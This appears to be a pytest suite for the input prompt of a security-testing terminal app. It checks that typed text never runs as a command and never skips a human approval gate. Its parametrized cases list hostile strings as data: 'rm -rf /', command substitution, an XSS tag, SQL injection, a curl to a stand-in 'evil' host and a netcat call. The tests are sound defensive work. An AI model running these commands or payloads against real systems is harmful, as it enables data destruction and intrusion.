"""The Start prompt's input checks: empty lines, slash commands, suggestions, targets, layout.

Safety first: no line typed here may decide a gate. A valid target only starts the run,
which stops at its first gate (template or scope) for the person to decide.
"""

import pytest
from textual import events

from reconix import store
from reconix.commands import COMMANDS
from reconix.screens import (
    ApprovalScreen,
    FindingsListScreen,
    HelpScreen,
    PlanScreen,
    StartScreen,
    TemplateScreen,
)
from reconix.screens.start import DASH_RANGE_UNSUPPORTED, EMPTY_HINT
from reconix.widgets import ChoiceMenu, FlowProgress, PromptBox

from .support import ASK_REQUEST, SIZE, pass_gate, settle, show

SMALL = (80, 24)


def box(app) -> PromptBox:
    return app.screen.query_one(PromptBox)


def burst_of_enters(app, count: int) -> None:
    """Enter pressed `count` times faster than the app reacts, as a terminal delivers them.

    `pilot.press()` waits for the app to go idle between keys, so it can't model a double tap.
    """
    for _ in range(count):
        key = events.Key("enter", "\r")
        key.set_sender(app)
        app._driver.send_message(key)


async def type_and_enter(pilot, text: str) -> None:
    box(pilot.app).input.value = text
    await pilot.press("enter")
    await settle(pilot)


def decided() -> tuple:
    """Every human decision the run records: none may happen without the person."""
    return (
        store.is_scope_approved(),
        store.get_run().plan_started,
        len(store.list_approval_decisions()),
    )


# --- empty input -------------------------------------------------------------------------------
@pytest.mark.parametrize("text", ["", " ", "   \t  "])
async def test_an_empty_line_does_nothing(app, text):
    async with app.run_test(size=SIZE) as pilot:
        await settle(pilot)
        assessments = len(store.list_assessments())
        await type_and_enter(pilot, text)
        assert isinstance(app.screen, StartScreen) and app.screen.query("#logo")
        assert not store.get_run().started
        assert len(store.list_assessments()) == assessments
        assert not store.list_requests()
        assert box(app).message == EMPTY_HINT


async def test_enter_outside_the_prompt_starts_nothing(app):
    async with app.run_test(size=SIZE) as pilot:
        app.screen.action_begin()
        await settle(pilot)
        assert isinstance(app.screen, StartScreen) and not store.get_run().started


async def test_during_a_run_an_empty_line_reopens_the_waiting_gate(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, ASK_REQUEST)
        assert store.waiting_gate() == "template"
        await show(app, pilot, "start")
        await type_and_enter(pilot, "")
        assert isinstance(app.screen, TemplateScreen)
        assert store.waiting_gate() == "template" and decided() == (False, False, 0)


# --- slash commands ------------------------------------------------------------------------------
async def test_an_unknown_command_explains_and_keeps_the_text(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/plna")
        assert isinstance(app.screen, StartScreen)
        assert box(app).message == (
            'Unknown command "/plna". Did you mean /plan? Type / to see all commands.'
        )
        assert box(app).input.value == "/plna"
        shown = str(app.screen.query_one("#prompt-hint").render())
        assert "Did you mean /plan?" in shown


async def test_the_error_clears_on_the_next_keystroke(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/plna")
        assert box(app).message
        await pilot.press("backspace")
        await settle(pilot)
        assert box(app).message == ""
        assert "Unknown" not in str(app.screen.query_one("#prompt-hint").render())


async def test_a_wrong_argument_shows_the_usage(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/plan now")
        assert isinstance(app.screen, StartScreen)
        assert box(app).message == "/plan takes no argument. Usage: /plan"


async def test_a_bad_choice_shows_the_usage_and_choices(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/export xls")
        assert isinstance(app.screen, StartScreen)
        assert box(app).message.startswith('"xls" isn\'t a format here. Usage: /export [format]')


async def test_a_valid_command_runs_in_any_case(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "  /FINDINGS ")
        assert isinstance(app.screen, FindingsListScreen)


async def test_markup_in_a_typed_command_is_shown_literally(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/[red]x")
        assert "[red]x" in str(app.screen.query_one("#prompt-hint").render())


# --- suggestions ---------------------------------------------------------------------------------
async def test_a_bare_slash_shows_the_list_and_runs_nothing(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash", "enter")
        await settle(pilot)
        assert isinstance(app.screen, StartScreen)
        assert box(app).menu_open and box(app).menu.option_count == len(COMMANDS)
        assert box(app).input.value == "/"


async def test_after_moving_the_highlight_enter_runs_it(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash", "down", "up", "enter")  # back on the first: /help
        await settle(pilot)
        assert isinstance(app.screen, HelpScreen)


async def test_typing_filters_and_up_down_move_the_highlight(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash", "f", "i", "n", "d")
        await pilot.pause()
        assert box(app).menu.option_count == 2  # /findings, /finding
        assert box(app).menu.highlighted_id == "findings"
        await pilot.press("down")
        assert box(app).menu.highlighted_id == "finding"
        await pilot.press("up")
        assert box(app).menu.highlighted_id == "findings"
        await pilot.press("enter")
        await settle(pilot)
        assert isinstance(app.screen, FindingsListScreen)


async def test_tab_completes_the_highlighted_command(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash", "p", "l")
        await pilot.pause()
        await pilot.press("tab")
        assert box(app).input.value == "/plan" and not box(app).menu_open
        await pilot.press("enter")
        await settle(pilot)
        assert isinstance(app.screen, PlanScreen)


async def test_esc_closes_the_list_then_clears_then_does_nothing(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash", "f")
        await pilot.pause()
        await pilot.press("escape")
        assert not box(app).menu_open and box(app).input.value == "/f"
        await pilot.press("escape")
        assert box(app).input.value == ""
        await pilot.press("escape")
        await settle(pilot)
        assert isinstance(app.screen, StartScreen)


async def test_the_list_hides_when_the_line_stops_being_a_command(app):
    async with app.run_test(size=SIZE) as pilot:
        await pilot.press("slash")
        await pilot.pause()
        assert box(app).menu_open
        await pilot.press("backspace", "h")
        await pilot.pause()
        assert not box(app).menu_open and box(app).input.value == "h"


async def test_up_without_the_list_recalls_history(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "hello")
        await pilot.press("up")
        assert box(app).input.value == "hello"


# --- targets -------------------------------------------------------------------------------------
@pytest.mark.parametrize(
    "text, says",
    [
        ("http://", "has no host name"),
        ("256.0.0.1", "isn't a valid IPv4 address"),
        ("10.0.0.5-10.0.0.1", "runs backwards"),
        ("file:///etc/passwd", "file: links aren't supported"),
        ("/does/not/exist", "doesn't exist"),
        ("10.0.0.0/8", "too wide"),
    ],
)
async def test_an_invalid_target_is_explained_and_nothing_starts(app, text, says):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, text)
        assert isinstance(app.screen, StartScreen) and not store.get_run().started
        assert says in box(app).message and box(app).input.value == text


async def test_a_dash_range_asks_for_cidr(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "10.0.0.1-20")
        assert not store.get_run().started
        assert box(app).message == DASH_RANGE_UNSUPPORTED


async def test_a_sentence_is_still_chat(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "what can you test?")
        assert isinstance(app.screen, StartScreen) and not store.get_run().started
        assert box(app).message == ""


# --- safety: a target moves the flow one step, never past a gate ---------------------------
@pytest.mark.parametrize(
    "text, gate",
    [
        ("https://app.example.com", "scope"),  # a URL picks its template itself
        ("192.0.2.10", "scope"),
        ("10.0.0.0/24", "scope"),
        ("git@github.com:acme/app.git", "scope"),
        (ASK_REQUEST, "template"),  # a bare host: the person picks the template
    ],
)
async def test_a_valid_target_stops_at_the_first_gate(app, text, gate):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, text)
        assert store.waiting_gate() == gate
        assert isinstance(app.screen, TemplateScreen)
        assert decided() == (False, False, 0)
        assert store.gate_state("scope") == "pending" and store.gate_state("plan") == "pending"


async def test_no_command_or_jump_decides_a_gate(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        assert store.waiting_gate() == "scope"
        for line in ("/approval", "/status", "/plan", "/findings", "/report"):
            assert app.run_command_line(line)
            await settle(pilot)
        for name in ("approval", "execution", "plan"):
            await show(app, pilot, name)
        assert isinstance(app.screen, PlanScreen)
        await show(app, pilot, "approval")
        assert isinstance(app.screen, ApprovalScreen)
        await pilot.press("enter")  # nothing waits: lists the decisions
        await settle(pilot)
        assert store.waiting_gate() == "scope" and decided() == (False, False, 0)


async def test_a_second_target_does_not_skip_the_waiting_gate(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        await show(app, pilot, "start")
        await type_and_enter(pilot, "https://other.example.com")
        assert store.waiting_gate() == "scope" and decided() == (False, False, 0)


# --- layout -----------------------------------------------------------------------------------
def _inside(app, widget) -> bool:
    region = widget.region
    width, height = app.size
    return (
        region.width > 0
        and region.height > 0
        and region.x >= 0
        and region.y >= 0
        and region.right <= width
        and region.bottom <= height
    )


@pytest.mark.parametrize("size", [SMALL, (160, 50)])
async def test_input_rail_and_suggestions_fit_the_screen(app, size):
    async with app.run_test(size=size) as pilot:
        await settle(pilot)
        rail = app.screen.query_one(FlowProgress)
        await pilot.press("slash")
        await pilot.pause()
        assert box(app).menu_open
        for widget in (rail, box(app).input, box(app).menu):
            assert _inside(app, widget), widget
        assert box(app).menu.region.bottom <= box(app).input.region.y  # above, not over it
        assert box(app).menu.region.y > rail.region.bottom - 1  # never over the rail


@pytest.mark.parametrize("size", [SMALL, (160, 50)])
async def test_a_long_error_keeps_the_input_and_rail_on_screen(app, size):
    async with app.run_test(size=size) as pilot:
        await type_and_enter(pilot, "/does/not/exist" + "x" * 80)
        await type_and_enter(pilot, "hello-there")  # chat: no error, the welcome goes
        await show(app, pilot, "start")
        app.screen.query_one(PromptBox).show_error(store.validate_target("nope").error)
        await settle(pilot)
        hint = app.screen.query_one("#prompt-hint")
        assert 1 < hint.region.height <= 3
        for widget in (app.screen.query_one(FlowProgress), box(app).input, hint):
            assert _inside(app, widget), widget


async def test_the_logo_stays_on_screen_at_the_smallest_size(app):
    async with app.run_test(size=SMALL) as pilot:
        await settle(pilot)
        box(app).show_error(store.validate_target("nope").error)
        await settle(pilot)
        logo = app.screen.query_one("#logo")
        assert logo.region.height > 0 and logo.region.y >= 0


# --- repeated Enter: one submission, and never a gate decision -----------------------------
async def test_a_repeated_enter_submits_once_and_decides_no_gate(app, monkeypatch):
    monkeypatch.setattr(ChoiceMenu, "ARM_DELAY", 0.5)  # the real app's guard
    async with app.run_test(size=SIZE) as pilot:
        await settle(pilot)
        assessments = len(store.list_assessments())
        box(app).input.value = "https://app.example.com"
        burst_of_enters(app, 3)
        await settle(pilot, rounds=10)
        assert store.waiting_gate() == "scope" and isinstance(app.screen, TemplateScreen)
        assert decided() == (False, False, 0)
        assert len(store.list_requests()) == 1
        assert len(store.list_assessments()) == assessments


async def test_enter_pressed_as_a_gate_appears_decides_nothing(app, monkeypatch):
    # A long arm delay, so the burst lands inside it however slow the machine is.
    monkeypatch.setattr(ChoiceMenu, "ARM_DELAY", 5.0)
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        assert store.waiting_gate() == "scope" and isinstance(app.screen, TemplateScreen)
        burst_of_enters(app, 3)  # e.g. Enter still held from the Start prompt
        await pilot.press("1")  # or a digit pick
        await settle(pilot, rounds=10)
        assert store.waiting_gate() == "scope" and decided() == (False, False, 0)


async def test_a_deliberate_enter_after_the_delay_still_decides(app, monkeypatch):
    monkeypatch.setattr(ChoiceMenu, "ARM_DELAY", 0.2)
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        assert store.waiting_gate() == "scope"
        await pilot.pause(0.3)
        await pilot.press("enter")  # the person approves the scope
        await settle(pilot)
        assert store.is_scope_approved()


async def test_a_repeated_enter_on_an_invalid_target_changes_nothing(app):
    async with app.run_test(size=SIZE) as pilot:
        box(app).input.value = "256.0.0.1"
        burst_of_enters(app, 3)
        await settle(pilot)
        assert isinstance(app.screen, StartScreen) and not store.get_run().started
        assert "isn't a valid IPv4 address" in box(app).message


# --- untrusted text: never run, never markup -------------------------------------------------
@pytest.fixture
def no_processes(monkeypatch):
    """Fail the test if anything tries to start a process from typed input."""
    import os
    import subprocess

    def refuse(*args, **kwargs):
        raise AssertionError(f"tried to run a process: {args!r}")

    for name in ("run", "Popen", "call", "check_call", "check_output"):
        monkeypatch.setattr(subprocess, name, refuse)
    monkeypatch.setattr(os, "system", refuse)


@pytest.mark.parametrize(
    "text",
    [
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "<script>alert(1)</script>",
        "[bold red]boom[/]",
        "[31mred[0m",
        "日本語のテスト 🚀",
        "' OR 1=1 --",
    ],
)
async def test_special_characters_are_text_never_commands(app, no_processes, text):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, text)
        assert isinstance(app.screen, StartScreen)
        assert not store.get_run().started and decided() == (False, False, 0)


@pytest.mark.parametrize(
    "text, target",
    [
        ("&& curl https://evil.example", "evil.example"),
        ("| nc 192.0.2.1 4444", "192.0.2.1"),
    ],
)
async def test_shell_syntax_around_a_target_is_ignored_and_the_scope_waits(
    app, no_processes, text, target
):
    # A line that names a target starts the run on it (the parser's existing rule); the
    # shell syntax is never run, and the person still has to approve the scope.
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, text)
        assert store.get_assessment().target == target
        assert store.waiting_gate() == "scope" and decided() == (False, False, 0)


async def test_markup_in_a_rejected_target_is_shown_literally(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "/[bold]nope[/bold]/x")
        shown = str(app.screen.query_one("#prompt-hint").render())
        assert "[bold]nope[/bold]" in shown and "doesn't exist" in shown


# --- very long input -----------------------------------------------------------------------
@pytest.mark.parametrize(
    "text",
    [
        "a" * (store.MAX_REQUEST_LENGTH + 1),
        "https://app.example.com/" + "x" * 600,
        "please test " * 60,
    ],
)
async def test_a_line_over_the_limit_is_refused_inline(app, text):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, text)
        assert isinstance(app.screen, StartScreen) and not store.get_run().started
        assert f"keep it under {store.MAX_REQUEST_LENGTH}" in box(app).message
        assert box(app).input.value == text


async def test_a_line_at_the_limit_is_sent(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "hello " + "a" * (store.MAX_REQUEST_LENGTH - 6))
        assert box(app).message == "" and box(app).input.value == ""


# --- a new target never reuses the old scope or approvals ----------------------------------
async def pass_gates_until(app, pilot, done) -> None:
    while not done() and store.waiting_gate():
        await pass_gate(app, pilot)


async def test_a_new_target_starts_from_a_fresh_scope_and_no_approvals(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        await pass_gates_until(app, pilot, lambda: bool(store.list_approval_decisions()))
        first = store.get_assessment()
        assert store.is_scope_approved() and store.list_approval_decisions()

        assert app.run_command_line("/new")
        await settle(pilot)
        assert isinstance(app.screen, StartScreen)
        assert decided() == (False, False, 0) and store.waiting_gate() == ""

        await type_and_enter(pilot, "192.0.2.10")
        assert store.get_assessment() is not first
        assert store.get_assessment().target == "192.0.2.10"
        assert store.waiting_gate() == "scope" and decided() == (False, False, 0)
        assert first.target == "app.example.com"  # the old one keeps its own decisions


async def test_template_after_an_approved_scope_starts_a_new_assessment(app):
    async with app.run_test(size=SIZE) as pilot:
        await type_and_enter(pilot, "https://app.example.com")
        await pass_gates_until(app, pilot, store.is_scope_approved)
        first = store.get_assessment()
        assert app.run_command_line("/template")
        await settle(pilot)
        assert store.get_assessment() is not first
        assert decided() == (False, False, 0)
